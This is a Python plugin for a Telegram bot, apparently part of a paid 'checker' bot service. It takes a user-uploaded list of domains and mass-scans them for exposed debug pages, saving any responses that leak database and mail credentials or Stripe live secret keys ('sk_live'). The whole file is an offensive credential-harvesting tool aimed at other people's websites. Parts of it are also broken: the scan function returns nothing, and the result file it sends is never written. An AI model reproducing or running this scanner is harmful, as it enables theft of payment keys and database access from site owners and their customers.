import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import os
from concurrent.futures import ThreadPoolExecutor

import requests
from pyrogram import Client, filters

from plugins.func.users_sql import *

session = requests.session()
s = requests.session()

env_progress = {}
debug_progress = {}


class DebugScanner:
    def scan_debug(self, url):
        mch = [
            "DB_HOST",
            "MAIL_HOST",
            "DB_CONNECTION",
            "MAIL_USERNAME",
            "sk_live",
            "APP_DEBUG",
        ]
        try:
            data = {"debug": "true"}
            r = requests.post(
                f"https://{url}",
                data=data,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )
            resp = r.text
            if any(key in resp for key in mch):
                with open(
                    os.path.join("DEBUG", f"{url}_debug.htm"), "w", encoding="utf-8"
                ) as output:
                    output.write(f"{resp}\n")
                if "sk_live" in resp:
                    with open(
                        os.path.join("SK", f"{url}_debug.htm"), "w", encoding="utf-8"
                    ) as output:
                        output.write(f"{resp}\n")
        except Exception as e:
            print(f"Error scanning debug info for {url}: {str(e)}")


@Client.on_message(filters.command("debug"))
async def cmd_debugscanner(Client, message):
    try:
        # NES TOOLS
        user_id = str(message.from_user.id)
        str(message.chat.type)
        str(message.chat.id)
        regdata = fetchinfo(user_id)
        results = str(regdata)
        if results == "None":
            resp = "You Are Not Registered ⚠️. First Register By Using /register To Use Me ."
            await message.reply_text(resp, message.id)
        else:
            #
            # PLAN CHECK
            await plan_expirychk(user_id)
            # PM AND AUTH CHECK
            pm = fetchinfo(user_id)
            status = pm[2]
            role = status
            if not message.reply_to_message:
                return await message.reply_text("Please Reply To File")
            if not message.reply_to_message.document:
                return await message.reply_text("Please Reply To File")
            tic = time.perf_counter()
            ms_ = "ENV Scanning...."
            domain_file = await message.reply_to_message.download(
                progress_args=(ms_, f"`Downloading This File!`")
            )
            with open(domain_file, "r") as file:
                domains = file.read().splitlines()
            x = len(domains)
            await message.reply_text(ms_)
            results = []
            x = len(results)
            try:
                debug_scanner = DebugScanner()
                with ThreadPoolExecutor(max_workers=5) as executor:
                    for i, result in enumerate(
                        executor.map(debug_scanner.scan_debug, domains)
                    ):
                        if result:
                            results.append(result)
                if results:
                    result_text = "\n".join(results)
                    with open("debug_results.txt", "w") as result_file:
                        result_file.write(result_text)
                    toc = time.perf_counter()
                    str(message.chat.id)
                    x = len(results)
                    resp = f"""
SK ENV SCAN COMPLETED ✅

┏－－－－－－－－－－－－┒
┠ SK - <code>{x}</code>
┠ Time To Scan - {toc - tic:0.4f}sec
┠ Scan By - <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> [ {role} ]
┠ 𝘋𝘦𝘝 - <a href="tg://user?id=1418571871">̠print('𝙍𝝣𝘽𝝣𝙇™ </> ⚠️')</a>
┗－－－－－－－－－－－－┛"""
                    await message.reply_document(
                        document=f"{x}x_DEBUG_BY_@JoannaChkBot.txt",
                        caption=resp,
                        reply_to_message_id=message.id,
                    )
                    os.remove(f"{x}x_DEBUG_BY_@JoannaChkBot.txt")
                else:
                    await message.reply_text("NO result", message.id)
            except Exception as e:
                await message.reply_text(e, message.id)
    except Exception as e:
        print(e)
